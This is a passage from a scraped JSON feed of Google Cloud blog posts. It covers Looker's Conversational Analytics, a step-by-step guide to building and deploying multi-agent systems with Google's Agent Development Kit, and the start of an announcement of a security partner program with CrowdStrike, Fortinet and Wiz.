knowledgeable colleague. By tapping into human conversation, Conversational Analytics relieves you from struggling with complex dashboard filters, obscure field names, or the need to write custom SQL.</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"At YouTube, we're focused on helping creators succeed and bring their creativity to the world. We've been testing Conversational Analytics in Looker to give our partner managers instant, actionable data that lets them quickly guide creators and optimize creator support.\" </span><span style=\"vertical-align: baseline;\">- Thomas Seyller, Senior Director, Technology &amp; Insights, YouTube Business</span><span style=\"font-style: italic; vertical-align: baseline;\">\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The general availability of Conversational Analytics combines the reasoning power of Gemini, new capabilities in Google\u2019s agentic frameworks, and the trusted data modeling of the Looker platform. Together, these set the stage for the next chapter in self-service analytics, making reliable data insights accessible to the entire enterprise. Conversational Analytics agents can understand your questions and provide insightful answers to questions about your data.</span></p>\n<p><span style=\"vertical-align: baseline;\">New at general availability is the ability to analyze data across domains. You can ask questions that integrate insights from up to five distinct Looker Explores (pre-joined views), spanning multiple business areas. Additionally, you can share the agents you build with colleagues, giving them faster access to a single source of truth, speeding consensus, and driving uniform decisions.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_pGc6nvS.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>You can build and share agents with colleagues to have a consistent data picture.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Built on a trusted, governed foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The power of Conversational Analytics isn't just in the conversation it enables; it's in the trust of the underlying data. Conversational Analytics is grounded in Looker\u2019s </span><a href=\"https://cloud.google.com/blog/products/data-analytics/lookers-universal-semantic-model\"><span style=\"text-decoration: underline; vertical-align: baseline;\">semantic layer</span></a><span style=\"vertical-align: baseline;\">, which ensures that every metric, field, and calculation is centrally defined and consistent, acting as a crucial context engine for AI. As more of your colleagues rapidly use these expanded capabilities, you need to know the results they see and act on are accurate.</span></p>\n<p><span style=\"vertical-align: baseline;\">For analysts looking to explore data or everyday users receiving insights in the context of their business, Conversational Analytics also improves data self-service, minimizing technical friction that can create bottlenecks and leaves insights locked away.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can now:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Ask anything, anytime: </strong><span style=\"vertical-align: baseline;\">Get instant answers to simple questions like \u201cShow me our website traffic last month for shoe sales,\u201d leading to deeper questions and greater insights across business areas and domains.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deepen the discovery: </strong><span style=\"vertical-align: baseline;\">Move beyond the constraints of static dashboards and ask open-ended questions like, \u201cShow me the trend of website traffic over the past six months and filter it by the California region.\u201d The system intelligently generates the appropriate query and visualization instantly.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Extend enterprise BI: </strong><span style=\"vertical-align: baseline;\">Connect your Looker models to your enterprise BI ecosystem, centralize and share agents, and create new dashboards, starting with a prompt. Built on top of </span><a href=\"https://docs.cloud.google.com/looker/docs/creating-and-editing-explores\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker Explores</span></a><span style=\"vertical-align: baseline;\">, Conversational Analytics\u2019 natural language interface usesLookML for fine tuning and output accuracy.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pivot quickly:</strong><span style=\"vertical-align: baseline;\"> The conversational interface supports multi-turn questions, so you can iterate on your findings. Ask for total sales, then follow up with, \"Now show me that as an area chart, broken down by payment method.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Gain full transparency:</strong><span style=\"vertical-align: baseline;\"> To build confidence and data literacy, the \"How was this calculated?\" feature provides a clear, natural language explanation of the underlying query that generated the results, so that you understand the source of your findings.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Empower the BI analyst and business user</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Conversational Analytics is democratizing data for business teams, helping them govern the business\u2019s data. At the same time, it\u2019s also enhancing productivity and influence for data analysts and developers.</span></p>\n<p><span style=\"vertical-align: baseline;\">When business users can self-serve trusted data insights, data analysts see fewer interruptions and \u201cad-hoc\u201d ticket requests, and can instead focus on high-impact work. Analysts can customize their client teams\u2019 BI experiences by building Conversational Analytics agents that define common questions, filters, and style guidelines, so different teams can act on the same data in different ways.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get ready to start talking</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Conversational Analytics is available now for all Looker platform users. Your admin can enable it in your Looker instance today and you will discover how easy it is to move from simply asking \u201cWhat?\u201d to confidently determining \u201cWhat\u2019s next?\u201d For more information, review the </span><a href=\"https://docs.cloud.google.com/looker/docs/conversational-analytics-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">product documentation</span></a><span style=\"vertical-align: baseline;\"> or watch this </span><a href=\"https://www.youtube.com/watch?v=9_akO0Q9Z3k\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">video tutorial</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-13 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/startups/four-steps-for-startups-to-build-multi-agent-systems/",
        "title": "Technical guide: Four steps for startups to build multi-agent systems",
        "thumbnail": null,
        "author": "Oluwamayowa Awojuyigbe",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">AI agents are transforming the nature of work by automating complex workflows with speed, scale, and accuracy.\u00a0 At the same time, startups are constantly moving, growing, and evolving \u2013 which means they need clear ways to implement agentic workflows, not piles of documentation that send precious resources into a tailspin.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we\u2019ll share a simple four-step framework to help startups build multi-agent systems.\u00a0 Multi-agentic workflows can be complicated, but there are easy ways to get started and see real gains without spending weeks in production.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In this post, we\u2019ll show you a systematic, operations-driven roadmap for navigating this new landscape, using one of our projects to provide concrete examples for the concepts laid out in the </span><a href=\"https://cloud.google.com/resources/content/building-ai-agents\">official Startups technical guide: AI agents</a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #1: Build your foundation\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">The startups technical guide outlines three primary paths for leveraging agents:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Pre-built Google agents</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Partner agents</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Custom-built agents (agents you build on your own).</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">To build our Sales Intelligence Agent, we needed to automate a highly specific, multi-step workflow that involved our own proprietary logic and would eventually connect to our own data sources. This required comprehensive orchestration control and tool definition that only a \"code-first\" approach could provide.</span></p>\n<p><span style=\"vertical-align: baseline;\">That\u2019s why we chose Google's </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\"> as our framework. It offered the balance of power and flexibility necessary to build a truly custom, defensible system, combined with high-level abstractions for agent composition and orchestration that accelerated our development.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #2: Build out the engine\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">We took a hybrid approach when building our agent architecture, which is managed by a top-level </span><span style=\"vertical-align: baseline;\">root_agent</span><span style=\"vertical-align: baseline;\"> in </span><a href=\"http://orchestrator.py\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">orchestrator.py</span></a><span style=\"vertical-align: baseline;\">. Its primary role is to act as an intelligent controller </span><span style=\"font-style: italic; vertical-align: baseline;\">using an LLM Agent for flexible user interaction</span><span style=\"vertical-align: baseline;\">, while delegating the core processing loop to </span><span style=\"font-style: italic; vertical-align: baseline;\">[more deterministic ADK components like </span><span style=\"font-style: italic; vertical-align: baseline;\">LoopAgent</span><span style=\"font-style: italic; vertical-align: baseline;\"> and custom </span><span style=\"font-style: italic; vertical-align: baseline;\">BaseAgent</span><span style=\"font-style: italic; vertical-align: baseline;\"> classes</span><span style=\"vertical-align: baseline;\">.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Conversational onboarding: </strong><span style=\"vertical-align: baseline;\">The LLM Agent starts by acting as a conversational \"front-door,\" interacting with the user to collect their name and email.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Workflow delegation: </strong><span style=\"vertical-align: baseline;\">Once it has the user's information, it delegates the main workflow to a powerful LoopAgent defined in its sub_agents list.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data loading: </strong><span style=\"vertical-align: baseline;\">The first step inside the LoopAgent is a custom agent called the CompanyLoopController. On the very first iteration of the loop, its job is to call our crm_tool to fetch the list of companies from the Google Sheet and load them into the session state.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tool-based execution in a loop: </strong><span style=\"vertical-align: baseline;\">\u00a0The loop processes each company by calling two key tools: the </span><span style=\"vertical-align: baseline;\">research_pipeline</span><span style=\"vertical-align: baseline;\"> tool that encapsulates our complex </span><span style=\"vertical-align: baseline;\">company_researcher_agent</span><span style=\"vertical-align: baseline;\"> and the </span><span style=\"vertical-align: baseline;\">sales_briefing_agent</span><span style=\"vertical-align: baseline;\"> tool\u00a0 that encapsulates the </span><span style=\"vertical-align: baseline;\">sales_briefing_agent</span><span style=\"vertical-align: baseline;\">. This \"Agent-as-a-Tool\" pattern is crucial for state isolation (more in Step 3).</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This hybrid pattern gives us the best of both worlds: the flexibility of an LLM for user interaction and the structured, reliable control of a workflow agent with isolated, tool-based execution.\u00a0</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #3: Tools, state, and reliability</span></h3>\n<p><span style=\"vertical-align: baseline;\">An agent is only as powerful as the tools it can wield. To be truly useful, our system needed to connect to live data, not just a static local file. To achieve this, we built a custom tool, crm_tool.py, to allow our agent to read its list of target companies directly from a Google Sheet.</span></p>\n<p><span style=\"vertical-align: baseline;\">To build our read_companies_from_sheet function, we focused on two key areas:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Secure authentication</strong><span style=\"vertical-align: baseline;\">: We used a Google Cloud Service Account for authentication, a best practice for production systems. Our code includes a helper function, get_sheets_service(), that centralizes all the logic for securely loading the service account credentials and initializing the API client.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Configuration management:</strong><span style=\"vertical-align: baseline;\"> All configuration, including the SPREADSHEET_ID, is managed via our .env file. This decouples the tool's logic from its configuration, making it portable and secure.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This approach transformed our agent from one that could only work with local data to one that could securely interact with a live, cloud-based source of truth.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Managing state in loops: The \"Agent-as-a-Tool\" Pattern</strong><span style=\"vertical-align: baseline;\"> A critical challenge in looping workflows is ensuring state isolation between iterations. ADK's </span><span style=\"vertical-align: baseline;\">session.state</span><span style=\"vertical-align: baseline;\"> persists, which can cause 'context rot' if not managed. Our solution was the </span><strong style=\"vertical-align: baseline;\">\"Agent-as-a-Tool\"</strong><span style=\"vertical-align: baseline;\"> pattern. Instead of running the complex </span><span style=\"vertical-align: baseline;\">company_researcher_agent</span><span style=\"vertical-align: baseline;\"> directly in the loop, we encapsulated its entire </span><span style=\"vertical-align: baseline;\">SequentialAgent</span><span style=\"vertical-align: baseline;\"> pipeline into a single, isolated </span><span style=\"vertical-align: baseline;\">AgentTool</span><span style=\"vertical-align: baseline;\"> (</span><span style=\"vertical-align: baseline;\">company_researcher_agent_tool</span><span style=\"vertical-align: baseline;\">).</span></p>\n<p><span style=\"vertical-align: baseline;\">Every time the loop calls this tool, the ADK provides a clean, temporary context for its execution. All internal steps (planning, QA loop, compiling) happen within this isolated context. When the tool returns the final </span><span style=\"vertical-align: baseline;\">compiled_report</span><span style=\"vertical-align: baseline;\">, the temporary context is discarded, guaranteeing a fresh start for the next company. This pattern provides perfect state isolation by design, making the loop robust without manual cleanup logic.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #4: Go from Localhost to a scalable deployed product\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">Here is our recommended three-step blueprint for moving from a local prototype to a production-ready agent on Google Cloud.</span></p>\n<p><strong style=\"vertical-align: baseline;\">1. Adopt a production-grade project template<br /></strong><span style=\"vertical-align: baseline;\">Our most critical lesson was that a simple, local-first project structure is not built for the rigors of the cloud. The turning point for our team was adopting </span><a href=\"https://googlecloudplatform.github.io/agent-starter-pack/cli/create.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google's official Agent Starter Pack</span></a><span style=\"vertical-align: baseline;\">. This professional template is not just a suggestion; for any serious project, we now consider it a requirement. It provides three non-negotiable foundations for success out of the box:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Robust dependency management:</strong><span style=\"vertical-align: baseline;\"> It replaces the simplicity of local tools like Poetry with the production-grade power of PDM and uv, ensuring that every dependency is locked and every deployment is built from a fast, deterministic, and repeatable environment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">A pre-configured CI/CD pipeline:</strong><span style=\"vertical-align: baseline;\"> It comes with a ready-to-use continuous integration and deployment pipeline for Google Cloud Build, which automates the entire process of testing, building, and deploying your agent.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Multi-environment support:</strong><span style=\"vertical-align: baseline;\"> The template is pre-configured for separate staging and production environments, a best practice that allows you to safely test changes in an isolated staging environment before promoting them to your live users.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The process begins by using the official command-line tool to generate your project's local file structure. This prompts you to choose a base template; we used the \"ADK Base Template\" and then moved our agent logic into the newly created source code files ( App) .</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Ensure pipx is installed\\r\\npip install --user pipx\\r\\n\\r\\n# Run the project generator to create the local file structure\\r\\npipx run agent-starter-pack create your-new-agent-project&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c174edf0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The final professional project structure:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;final-agent-project/\\r\\n\u251c\u2500\u2500 .github/              # Contains the automated CI/CD workflow configuration\\r\\n\u2502   \u2514\u2500\u2500 workflows/\\r\\n\u251c\u2500\u2500 app/                  # Core application source code for the agent\\r\\n\u2502   \u251c\u2500\u2500 __init__.py\\r\\n\u2502   \u251c\u2500\u2500 agent_engine_app.py\\r\\n\u2502   \u251c\u2500\u2500 orchestrator.py     # The main agent that directs the workflow\\r\\n\u2502   \u251c\u2500\u2500 company_researcher/ # Sub-agent for performing research\\r\\n\u2502   \u251c\u2500\u2500 briefing_agent/   # Sub-agent for drafting emails\\r\\n\u2502   \u2514\u2500\u2500 tools/              # Custom tools the agents can use\\r\\n\u251c\u2500\u2500 tests/                # Automated tests for your agent\\r\\n\u251c\u2500\u2500 .env                  # Local environment variables (excluded from git)\\r\\n\u251c\u2500\u2500 pyproject.toml        # Project definition and dependencies\\r\\n\u2514\u2500\u2500 uv.lock               # Locked dependency versions for speed and consistency&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c174e9a0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With the local files created, the next step is to provision the cloud infrastructure. From inside the new project directory, you run the setup-cicd command. This interactive wizard connects to your Google Cloud and GitHub accounts, then uses Terraform under the hood to automatically build your entire cloud environment, including the CI/CD pipeline.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Navigate into your new project directory\\r\\ncd your-new-agent-project\\r\\n\\r\\n# Run the interactive CI/CD setup wizard\\r\\npipx run agent-starter-pack setup-cicd&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c174ec70&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">2. Cloud Build\u00a0<br /></strong><span style=\"vertical-align: baseline;\">Once the setup is complete with the starter pack, your development workflow becomes incredibly simple. Every time a developer pushes a new commit to the main branch of your GitHub repository:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Google Cloud Build fetches your latest code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">It builds your agent into a secure, portable container image. This process includes installing all the dependencies from your uv.lock file, guaranteeing a perfect, repeatable build every single time.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">It deploys this new version to your staging environment. Within minutes, your latest code is live and ready for testing in a real cloud environment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">It waits for your approval. The pipeline is configured to require a manual \"Approve\" click in the Cloud Build console before it will deploy that exact same, tested version to your production environment. This gives you the perfect balance of automation and control.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">3. Deploy on Agent Engine and Cloud Run\u00a0<br /></strong><span style=\"vertical-align: baseline;\">The final piece of the puzzle is where the agent actually runs. Cloud Build deploys your agent to Vertex AI Agent Engine, which provides the secure, public endpoint and management layer for your agent.</span></p>\n<p><span style=\"vertical-align: baseline;\">Crucially, Agent Engine is built on top of Google Cloud Run, a powerful serverless platform. This means you don't have to manage any servers yourself. Your agent automatically scales up to handle thousands of users, and scales down to zero when not in use, meaning you only pay for the compute you actually consume.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong><span style=\"vertical-align: baseline;\">\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">Ready to build your own?</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Explore the</span><a href=\"https://github.com/Mayopepe/ai-agent-blog-series\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> code</span></a><span style=\"vertical-align: baseline;\"> for our Sales Intelligence Agent on GitHub.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Dive deeper with the </span><a href=\"https://cloud.google.com/resources/content/building-ai-agents?e=48754805&amp;hl=en\">Startups technical guide: AI agents</a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Get started with production deployments using the </span><a href=\"https://github.com/GoogleCloudPlatform/agent-starter-pack\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Starter Pack</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No matter where you are with AI adoption, we are here to help. </span><a href=\"https://cloud.google.com/contact/form?hl=nl\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Contact our Startup team</span></a><span style=\"vertical-align: baseline;\"> today and you could get up to $350,000 USD in cloud credits with the </span><a href=\"https://cloud.google.com/startup/apply?utm_source=cloud_sfdc&amp;utm_medium=et&amp;utm_campaign=FY21-Q1-global-demandgen-website-cs-startup_program_mc&amp;utm_content=futureofai&amp;utm_term=-&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google for Startups Cloud Program</span></a><span style=\"vertical-align: baseline;\">,</span></p>\n</li>\n</ul>\n<hr />\n<p><sup><span style=\"font-style: italic; vertical-align: baseline;\">The technical journey and insights detailed in this blog post were the result of a true team effort. I want to extend my sincere appreciation to the core collaborators whose work provided the foundation for this article:</span><strong style=\"font-style: italic; vertical-align: baseline;\"> Luis Sala</strong><span style=\"font-style: italic; vertical-align: baseline;\">,</span><strong style=\"font-style: italic; vertical-align: baseline;\"> Isaac Attuah</strong><span style=\"font-style: italic; vertical-align: baseline;\">, </span><strong style=\"font-style: italic; vertical-align: baseline;\">Ishana Shinde</strong><span style=\"font-style: italic; vertical-align: baseline;\">, </span><strong style=\"font-style: italic; vertical-align: baseline;\">Andrew Thankson</strong><span style=\"font-style: italic; vertical-align: baseline;\">, and</span><strong style=\"font-style: italic; vertical-align: baseline;\"> Kristin Kim</strong><span style=\"font-style: italic; vertical-align: baseline;\">. Their hands-on contributions to architecting and building the agent were essential to the lessons shared here.</span></sup></p></div>",
        "published_date": "2025-11-13 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/announcing-the-google-unified-security-recommended-program/",
        "title": "An open approach to security: Announcing Google Unified Security Recommended",
        "thumbnail": null,
        "author": "McCall McIntyre",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we believe that being at the forefront of driving secure innovation and meeting the evolving needs of customers includes working with partners. The reality is that the security landscape should be interoperable, and your security tools should be able to integrate with each other.\u00a0</span></p>\n<p><a href=\"https://cloud.google.com/security/google-unified-security?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Unified Security</span></a><span style=\"vertical-align: baseline;\">, our AI-powered, converged security solution, has been designed to support greater customer choice. To further this vision, today we\u2019re announcing </span><strong style=\"vertical-align: baseline;\">Google Unified Security Recommended</strong><span style=\"vertical-align: baseline;\">, a new program that expands strategic partnerships with market-leading security solutions trusted by our customers. </span></p>\n<p><span style=\"vertical-align: baseline;\">We welcome </span><a href=\"https://www.crowdstrike.com/en-us/press-releases/crowdstrike-named-inaugural-google-unified-security-recommended-partner/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Crowdstrike</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.fortinet.com/blog/unified-sase/fortinet-named-inaugural-google-unified-security-recommended-partner-for-network-protection-powered-by-fortisase-and-security-fabric\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Fortinet</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://wiz.io/blog/wiz-google-unified-security-recommended-program\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Wiz</span></a><span style=\"vertical-align: baseline;\"> as inaugural Google Unified Security Recommended partners. These integrations are designed to meet our customers where they are today and ensure their end-to-end deployments are built to scale with Google in the future.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1- GUS Rec Blog Image\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1-_GUS_Rec_Blog_Image.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Google Unified Security and our Recommended program partner solutions.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Building confidence through validated integrations</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As part of the Google Unified Security Recommended program, partners agree to adhere to comprehensive technical integration across Google\u2019s security product portfolio; a collaborative, customer-first support model that reflects our intent to collectively protect our customers; and invest jointly in AI innovation. This program offers our customers:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enhanced confidence</strong><span style=\"vertical-align: baseline;\">: Select partner products that have undergone evaluation and validation to ensure optimal integration with Google Unified Security.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Accelerated discovery</strong><span style=\"vertical-align: baseline;\">: Streamline your evaluation process with a carefully curated selection of market-leading solutions addressing specific enterprise challenges.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prioritize outcomes</strong><span style=\"vertical-align: baseline;\">: Minimize integration overhead, allowing your team to allocate resources towards building security solutions that deliver business outcomes.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We\u2019re working to ensure that customers can use solutions that are powerful today \u2014 and designed for future advancements. Learn more about the product-level requirements that define the Google Unified Security Recommended designation </span><a href=\"https://docs.cloud.google.com/chronicle/docs/reference/google-unified-security-recommended\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Our inaugural partners: Unifying your defenses</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our collaborations with </span><a href=\"https://services.google.com/fh/files/blogs/gus_recommended_crowdstrike.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CrowdStrike</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://services.google.com/fh/files/blogs/gus_recommended_fortinet_v2.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Fortinet</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://services.google.com/fh/files/blogs/gus_recommended_wiz.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Wiz</span></a><span style=\"vertical-align: baseline;\"> exemplify our \"better together\" philosophy by addressing tangible security challenges.</span></p>\n<p><strong style=\"vertical-align: baseline;\">CrowdStrike Falcon (endpoint protection)</strong><span style=\"vertical-align: baseline;\">: Integrations between the AI-native CrowdStrike Falcon\u00ae platform, Google Security Operations, Google Threat Intelligence, and Mandiant Threat Defense can enable customers to detect, investigate, and respond to threats faster across hybrid and multicloud environments.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Customers can use Falcon Endpoint risk signals to define Context-Aware access policies enforced by Google Chrome Enterprise. The collaboration also supports integrations that secure the AI lifecycle \u2014 and extends through the model context protocol (MCP) to advance AI for security operations. Together, CrowdStrike and Google Cloud deliver unified protection across endpoint, identity, cloud, and data.</span></p>\n<p><span style=\"vertical-align: baseline;\">\u201cCrowdStrike and Google Cloud share a vision for an open, AI-powered future of security. Together, we\u2019re uniting our leading AI-native platforms \u2013 Google Security Operations and the CrowdStrike Falcon\u00ae platform \u2013 to help customers harness the power of generative AI and stay ahead of modern threats,\u201d said Daniel Bernard, chief business officer, CrowdStrike.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Fortinet cloud-delivered SASE and Next-Generation Firewall (network protection)</strong><span style=\"vertical-align: baseline;\">:\u00a0Integrating Fortinet\u2019s Security Fabric with Google Security Operations combines AI-driven FortiGuard Threat Intelligence with rich network and web telemetry to deliver unified visibility and control across users, applications, and network edges.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Customers can integrate FortiSASE and FortiGate solutions into Google Security Operations to correlate activity across their environments, apply advanced detections, and automate coordinated response actions that contain threats in near real-time. This collaboration can help reduce complexity, streamline operations, and strengthen protection across hybrid infrastructures.</span></p>\n<p><span style=\"vertical-align: baseline;\">\u201cCustomers are demanding simplified security architectures that reduce complexity and strengthen protection,\u201d said Nirav Shah, senior vice president, Product and Solutions, Fortinet. \u201cAs an inaugural partner in the Google Cloud Unified Security Recommended program, we are combining the power of FortiSASE and the Fortinet Security Fabric with Google Cloud\u2019s security capabilities to converge networking and security across environments. This approach gives SecOps and NetOps shared visibility and coordinated controls, helping teams eliminate tool sprawl, streamline operations, and accelerate secure digital transformation.\u201d</span></p>\n<p><strong style=\"vertical-align: baseline;\">Wiz (multicloud CNAPP)</strong><span style=\"vertical-align: baseline;\">: Customers can integrate Wiz's 